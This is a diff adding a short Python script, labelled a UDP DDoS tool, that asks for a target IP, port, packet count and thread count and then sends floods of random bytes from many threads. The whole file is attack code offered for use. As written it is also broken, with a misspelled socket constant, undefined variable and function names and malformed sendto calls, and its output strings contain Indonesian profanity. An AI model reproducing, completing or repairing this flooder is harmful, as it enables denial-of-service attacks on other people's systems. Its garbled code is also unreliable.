@@ -1,0 +1,31 @@
+#simpledosudp
+#codebyxalbador
+import socket
+import random
+import threading
+import os,sys
+
+print("WELCOME DDOS BY ADIL")
+
+ip_ADIL = str(input("Ip Target : "))
+port_ADIL = int(input("Port Target : "))
+paket_ADIL = int(input("Paket kANG DDOS : "))
+threads_ADIL = int(input("Thread KANG DDOS : "))
+os.system("clear")
+
+def wibu():
+    asu = random._urandom(1024)#ubah angka urandom= damage
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
+            s.connect((ip_wibu,port_wibu))
+            s.sendto(asu)
+            for x in range(paket_ADIL):
+                s.sendto(JEMBUT)
+            print("[•] KONTOL!!!")
+        except:
+            print("[•] KONTOL!!!")
+
+for y in range(threads_adil):
+    th = threading.Thread(target=adil)
+    th.start()
